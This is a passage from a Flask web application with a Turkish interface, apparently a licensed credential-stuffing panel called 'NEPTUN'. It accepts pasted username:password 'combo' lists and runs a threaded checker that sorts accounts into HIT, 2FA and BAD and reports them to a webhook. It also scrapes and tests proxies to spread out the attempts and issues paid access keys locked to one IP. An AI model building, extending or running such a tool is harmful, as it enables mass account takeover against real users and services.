                    <table>
                        <thead><tr><th>Anahtar</th><th>Plan</th><th>Durum</th><th>IP</th></tr></thead>
                        <tbody>
                            {% for k, v in keys.items() %}
                            <tr>
                                <td style="font-size:10px;">{{ k }}</td>
                                <td>{{ v.plan }}</td>
                                <td><span class="status-badge {{ 'status-hit' if not v.used else 'status-bad' }}">{{ 'Kullanılmadı' if not v.used else 'Kullanıldı' }}</span></td>
                                <td>{{ v.used_ip or '—' }}</td>
                            </tr>
                            {% else %}
                            <tr><td colspan="4" style="color:#666;text-align:center;">Hiç anahtar yok</td></tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        {% endif %}
    </div>
</div>
</body>
</html>
'''

# ==================== FLASK ROTALARI ====================
@app.route('/')
def index():
    if session.get('authenticated'):
        return redirect(url_for('page', page='dashboard'))
    return redirect(url_for('page', page='dashboard'))

@app.route('/page/<page>')
def page(page):
    hits = load_hits()
    stats = {
        'hit': sum(1 for h in hits if h.get('status') == 'HIT'),
        'twofa': sum(1 for h in hits if h.get('status') == '2FA'),
        'bad': sum(1 for h in hits if h.get('status') == 'BAD'),
        'check': len(hits)
    }
    
    progress = load_checker_progress()
    progress_pct = 0
    if progress.get('total', 0) > 0:
        progress_pct = round((progress.get('done', 0) / progress.get('total', 1)) * 100)
    
    result_text = load_checker_result()
    proxy_result = load_proxy_result()
    proxy_status = f"Proxy: {len(load_proxies())} adet"
    
    live_proxies = load_live_proxies()
    live_count = len(live_proxies)
    
    proxy_check_result = session.pop('proxy_check_result', '⏳ Bekleniyor...')
    proxy_check_status = session.pop('proxy_check_status', '0 proxy yüklendi')
    
    # Auto refresh kontrolü - sadece checker veya proxy_scraper sayfasında ve session'da refresh flag varsa
    auto_refresh = False
    if page in ['checker', 'proxy_scraper']:
        auto_refresh = session.get('auto_refresh', False)
    
    return render_template_string(
        HTML,
        session=session,
        hits=hits,
        keys=load_keys(),
        page=page,
        stats=stats,
        progress=progress,
        progress_pct=progress_pct,
        result_text=result_text,
        proxy_result=proxy_result,
        proxy_status=proxy_status,
        live_count=live_count,
        proxy_check_result=proxy_check_result,
        proxy_check_status=proxy_check_status,
        auto_refresh=auto_refresh,
        webhook_msg=session.pop('webhook_msg', None),
        webhook_ok=session.pop('webhook_ok', False),
        settings_msg=session.pop('settings_msg', None),
        key_result=session.pop('key_result', None)
    )

@app.route('/login', methods=['POST'])
def login():
    key = request.form.get('key', '').strip()
    client_ip = get_client_ip()
    
    key_ip_data = load_key_ip()
    
    if key == MASTER_KEY:
        session['authenticated'] = True
        session['is_admin'] = True
        session['auto_refresh'] = False
        return redirect(url_for('page', page='dashboard'))
    
    keys = load_keys()
    if key not in keys:
        return render_template_string(
            HTML,
            error='❌ Geçersiz anahtar!',
            session=session,
            hits=load_hits(),
            keys=load_keys(),
            page='dashboard',
            auto_refresh=False
        )
    
    key_info = keys[key]
    
    if key_info.get('used', False):
        if key_info.get('used_ip') == client_ip:
            session['authenticated'] = True
            session['is_admin'] = False
            session['auto_refresh'] = False
            return redirect(url_for('page', page='dashboard'))
        else:
            return render_template_string(
                HTML,
                error=f'❌ Bu anahtar zaten başka bir IP tarafından kullanılıyor! (IP: {key_info.get("used_ip", "Bilinmiyor")})',
                session=session,
                hits=load_hits(),
                keys=load_keys(),
                page='dashboard',
                auto_refresh=False
            )
    
    keys[key]['used'] = True
    keys[key]['used_ip'] = client_ip
    keys[key]['used_at'] = datetime.utcnow().isoformat()
    save_keys(keys)
    
    key_ip_data[key] = client_ip
    save_key_ip(key_ip_data)
    
    session['authenticated'] = True
    session['is_admin'] = False
    session['auto_refresh'] = False
    return redirect(url_for('page', page='dashboard'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

# ==================== DOWNLOAD ====================
@app.route('/download/live_proxies')
def download_live_proxies():
    live_proxies = load_live_proxies()
    if not live_proxies:
        return "❌ Canlı proxy bulunamadı.", 404
    temp_file = 'live_proxies_download.txt'
    with open(temp_file, 'w', encoding='utf-8') as f:
        f.write('\n'.join(live_proxies))
    return send_file(temp_file, as_attachment=True, download_name='live_proxies.txt', mimetype='text/plain')

# ==================== ACTION ROTALARI ====================
@app.route('/action/checker', methods=['POST'])
def action_checker():
    action = request.form.get('action')
    global checker_running, checker_stop
    
    if action == 'start':
        combo_text = request.form.get('combo', '')
        lines = [l.strip() for l in combo_text.split('\n') if l.strip() and ':' in l]
        if not lines:
            save_checker_result('❌ Lütfen combo girin.')
            return redirect(request.referrer or url_for('page', page='checker'))
        
        combo_list = []
        for line in lines:
            u, p = line.split(':', 1)
            combo_list.append((u.strip(), p.strip()))
        
        thread = int(request.form.get('thread', 5))
        webhook = request.form.get('webhook', '')
        proxy = request.form.get('proxy', '')
        
        save_checker_result(f"🚀 Başlatıldı! {len(combo_list)} combo kontrol edilecek.\n\n")
        save_checker_progress({'done': 0, 'total': len(combo_list), 'hit': 0, 'twofa': 0, 'bad': 0})
        
        # AUTO REFRESH AÇ
        session['auto_refresh'] = True
        
        if not checker_running:
            threading.Thread(target=run_checker_thread, args=(combo_list, thread, webhook, proxy)).start()
    
    elif action == 'stop':
        checker_stop = True
        save_checker_result('⏹ Durduruldu.')
        session['auto_refresh'] = False
    
    elif action == 'clear':
        save_checker_result('⏳ Bekleniyor...')
        save_checker_progress({'done': 0, 'total': 0, 'hit': 0, 'twofa': 0, 'bad': 0})
        session['auto_refresh'] = False
    
    return redirect(request.referrer or url_for('page', page='checker'))

@app.route('/action/proxy_scrape', methods=['POST'])
def action_proxy():
    action = request.form.get('action')
    global proxy_running, proxy_stop
    
    if action == 'scrape':
        proxies = scrape_proxies()
        save_proxy_result(f'✅ {len(proxies)} proxy toplandı.\n\n' + '\n'.join(proxies[:30]))
        session['auto_refresh'] = False
    
    elif action == 'scrape_check':
        if not proxy_running:
            save_proxy_result("⏳ Proxy toplanıyor ve kontrol ediliyor... (Thread: 200)\n")
            session['auto_refresh'] = True
            threading.Thread(target=run_proxy_scrape_check_thread).start()
        else:
            save_proxy_result("⏳ Zaten çalışıyor...")
            session['auto_refresh'] = True
    
    elif action == 'list':
        proxies = load_proxies()
        if proxies:
            save_proxy_result(f'📋 {len(proxies)} proxy:\n\n' + '\n'.join(proxies[:50]))
        else:
            save_proxy_result('❌ Proxy bulunamadı.')
        session['auto_refresh'] = False
    
    elif action == 'clear':
        save_proxies([])
        save_live_proxies([])
        save_proxy_result('🗑️ Proxy\'ler temizlendi.')
        session['auto_refresh'] = False
    
    return redirect(request.referrer or url_for('page', page='proxy_scraper'))

@app.route('/action/proxy_check', methods=['POST'])
def action_proxy_check():
    action = request.form.get('action')
    
    if action == 'check':
        proxy_text = request.form.get('proxies', '')
        proxies = [p.strip() for p in proxy_text.split('\n') if p.strip()]
        if not proxies:
            session['proxy_check_result'] = '❌ Lütfen proxy girin.'
            session['proxy_check_status'] = '0 proxy yüklendi'
        else:
            results = []
            alive = 0
            for p in proxies[:30]:
                if check_proxy(p):
                    alive += 1
                    results.append(f'✅ CANLI | {p}')
                else:
                    results.append(f'❌ ÖLÜ | {p}')
            session['proxy_check_result'] = f'✅ {alive}/{len(proxies)} canlı\n\n' + '\n'.join(results)
            session['proxy_check_status'] = f'Canlı: {alive} | Ölü: {len(proxies)-alive} | Toplam: {len(proxies)}'
    elif action == 'clear':
        session['proxy_check_result'] = '⏳ Bekleniyor...'
        session['proxy_check_status'] = '0 proxy yüklendi'
    
    return redirect(request.referrer or url_for('page', page='proxy_checker'))

@app.route('/action/webhook', methods=['POST'])
def action_webhook():
    action = request.form.get('action')
    url = request.form.get('webhook_url', '')
    if action == 'save':
        session['webhook_url'] = url
        session['webhook_msg'] = '✅ Webhook kaydedildi.'
        session['webhook_ok'] = True
    elif action == 'test':
        if not url:
            session['webhook_msg'] = '❌ Lütfen URL girin.'
            session['webhook_ok'] = False
        else:
            try:
                r = requests.post(url, json={'content': '🔔 NEPTUN Webhook Test Başarılı!'}, timeout=10)
                if r.status_code in [200, 204]:
                    session['webhook_msg'] = '✅ Test başarılı!'
                    session['webhook_ok'] = True
                else:
                    session['webhook_msg'] = f'❌ Hata {r.status_code}'
                    session['webhook_ok'] = False
            except Exception as e:
                session['webhook_msg'] = f'❌ Hata: {str(e)}'
                session['webhook_ok'] = False
    return redirect(request.referrer or url_for('page', page='webhook'))

@app.route('/action/settings', methods=['POST'])
def action_settings():
    thread = request.form.get('thread', 5)
    timeout = request.form.get('timeout', 30)
    delay = request.form.get('delay', 0.1)
    session['thread'] = int(thread)
    session['timeout'] = int(timeout)
    session['delay'] = float(delay)
    session['settings_msg'] = '✅ Ayarlar kaydedildi.'
    return redirect(request.referrer or url_for('page', page='settings'))

@app.route('/action/key_gen', methods=['POST'])
def action_key_gen():
    if not session.get('is_admin'):
        return redirect(url_for('index'))
    plan = request.form.get('plan', '1d')
    raw = secrets.token_hex(12)
    key = f"NEPTUN-{plan.upper()}-{raw.upper()}"
    keys = load_keys()
    keys[key] = {'plan': plan, 'created': datetime.utcnow().isoformat(), 'used': False, 'used_ip': None}
    save_keys(keys)
    session['key_result'] = f'🔑 {key} ({plan})'
    return redirect(request.referrer or url_for('page', page='key_gen'))

# ==================== API ====================
@app.route('/api/stats')
def api_stats():
    hits = load_hits()
    return jsonify({
        'hit': sum(1 for h in hits if h.get('status') == 'HIT'),
        'twofa': sum(1 for h in hits if h.get('status') == '2FA'),
        'bad': sum(1 for h in hits if h.get('status') == 'BAD'),
        'check': len(hits)
    })

@app.route('/api/hits/clear', methods=['POST'])
def api_hits_clear():
    if not session.get('authenticated') or not session.get('is_admin'):
        return jsonify({'error': 'Yetkisiz'}), 401
    save_hits([])
    return jsonify({'success': True, 'message': 'HIT\'ler temizlendi'})

# ==================== BAŞLAT ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)